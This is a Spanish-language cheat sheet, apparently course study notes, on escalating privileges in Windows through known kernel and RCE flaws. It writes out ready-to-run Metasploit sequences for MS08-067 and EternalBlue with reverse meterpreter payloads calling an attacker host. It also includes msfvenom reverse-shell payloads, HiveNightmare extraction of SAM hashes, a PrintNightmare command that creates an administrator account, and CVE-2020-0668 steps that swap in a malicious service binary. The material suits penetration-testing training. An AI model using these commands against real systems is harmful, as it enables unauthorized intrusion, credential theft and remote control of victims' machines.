
# Escalada de Privilegios en Windows - Kernel Exploits

## Introducción
Mantener todos los equipos Windows actualizados es difícil. Incluso con SCCM o WSUS, siempre hay sistemas sin parches que pueden explotarse. Existen múltiples vulnerabilidades de kernel y RCE que afectan desde Windows XP hasta Windows Server 2019.

Este documento resume las vulnerabilidades más notables, sus métodos de explotación y ejemplos prácticos.

## Vulnerabilidades Notables y Ejemplos

### MS08-067
- **Tipo**: RCE en servicio RPC/SMB.
- **Sistemas Afectados**: Windows 2000/2003/XP/Vista/2008.
- **Descripción**: Error en el manejo de solicitudes RPC permite ejecución como SYSTEM.
- **Uso en Escalada**: Si SMB (445) está bloqueado externamente pero accesible localmente, se puede hacer port-forward y explotar.
- **Explotación**:
```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOST <victima>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <atacante>
exploit
```
- **Referencia**: [MS08-067 Metasploit](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi)

---

### MS17-010 (EternalBlue)
- **Tipo**: RCE en SMBv1.
- **Descripción**: SMBv1 maneja incorrectamente paquetes malformados → RCE como SYSTEM.
- **Uso**: Puede ser usado remotamente o para escalada local si 445 solo es accesible internamente.
- **Explotación**:
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <victima>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <atacante>
exploit
```
- **Referencia**: [EternalBlue PoC](https://github.com/worawit/MS17-010)

---

### CVE-2021-36934 (HiveNightmare / SeriousSam)
- **Tipo**: LPE - Lectura de hives del registro SAM/SYSTEM/SECURITY.
- **Descripción**: Usuarios estándar pueden leer los hives sensibles y extraer hashes.
- **Chequeo**:
```cmd
icacls c:\Windows\System32\config\SAM
```
- **Explotación**:
```powershell
HiveNightmare.exe
impacket-secretsdump -sam SAM-<fecha> -system SYSTEM-<fecha> -security SECURITY-<fecha> local
```
- **Referencia**: [HiveNightmare PoC](https://github.com/GossiTheDog/HiveNightmare)

---

### CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)
- **Tipo**: LPE/RCE vía Print Spooler.
- **Descripción**: RpcAddPrinterDriver permite cargar DLL maliciosas como SYSTEM sin privilegio SeLoadDriverPrivilege.
- **Comprobación**: si no existe, obtendremos un "path does not exist"
```powershell
ls \\localhost\pipe\spoolss
```
- **Explotación (PowerShell PoC)**:
```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
- **Referencia**: [PrintNightmare PoC cube0x0](https://github.com/cube0x0/CVE-2021-1675)


---

### CVE-2020-0668
- **Tipo**: LPE - File Arbitrary Move.
- **Descripción**: Windows Service Tracing permite mover archivos arbitrarios con privilegios SYSTEM usando enlaces simbólicos.
- **Proceso**:
  1. Se crea un payload malicioso (`maintenanceservice.exe`) con `msfvenom`.
  2. El exploit mueve el archivo a `C:\Program Files (x86)\Mozilla Maintenance Service\` reemplazando el binario legítimo.
  3. El movimiento **corrompe el binario** (error 216) → Por eso se usan **dos copias**: una se mueve (corrupta) para ganar control total (F) y otra se usa luego para reemplazarla manualmente. Se gana control total porque estamos moviendo un fichero creado por nosotros (tras obtenerlo de la máquina atacante) y windows mantiene los permisos de los ficheros que mueve.
- **Chequeo de permisos antes y después**:
```cmd
# Antes del exploit (solo RX)
icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Después del exploit (Full Control)
icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
- **Payload**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=8443 -f exe > maintenanceservice.exe
```


Alternativa payload sin metasploit:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATACANTE> LPORT=4444 -f exe -o shell_reverse.exe`

NOTA: Nos tranferimos a la maquina victima dos copias del payload. una maintenance.exe y otra maintenance2.exe. La primera para que se corrompa y moverlo y como pasamos un binario en el cual tenemos FULL CONTROL, se mantienen los permisos pero se corrompe el ejecutable tras usar el exploit.

- **Ejecutar exploit**:
```cmd
CVE-2020-0668.exe C:\Users\victima\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
- **Enlace PoC**: [CVE-2020-0668 Exploit](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)  Hay que compilarlo con VS.

Tras ejecutar el exploit, el ejecutable se corrompe por lo que pasamos la copia no corrompida mediente copy:
````cmd-session
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
````



---

### ALPC Task Scheduler 0-Day
- **Tipo**: LPE.
- **Descripción**: Usa SchRpcSetSecurity API para modificar DACLs y cargar DLL como SYSTEM vía Spooler.
- **Referencia**: Explorado en HackTheBox “Hackback”.

---

## Enumeración de Parches Faltantes

- **Comandos para listar actualizaciones instaladas**:
```powershell
systeminfo
wmic qfe list brief
Get-Hotfix
```
Podríamos hacernos a la idea de cuanto tiempo lleva sin actualizarse.

Buscar KB faltantes en [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/).

---

## Links Importantes

- **MS08-067 Exploit**: https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi
- **MS17-010 PoC**: https://github.com/worawit/MS17-010
- **HiveNightmare PoC**: https://github.com/GossiTheDog/HiveNightmare
- **PrintNightmare PoC**: https://github.com/cube0x0/CVE-2021-1675
- **CVE-2020-0668 Exploit**: https://github.com/RedCursorSecurityConsulting/CVE-2020-0668

---

## Notas Clave

- Muchas vulnerabilidades antiguas siguen presentes en entornos empresariales.
- EternalBlue (MS17-010) aún es común en infraestructuras antiguas.
- PrintNightmare afecta incluso a controladores de dominio.
- HiveNightmare permite extraer hashes sin privilegios.
- CVE-2020-0668 necesita combinarse con binarios de terceros vulnerables (ej. Mozilla Maintenance Service).

---
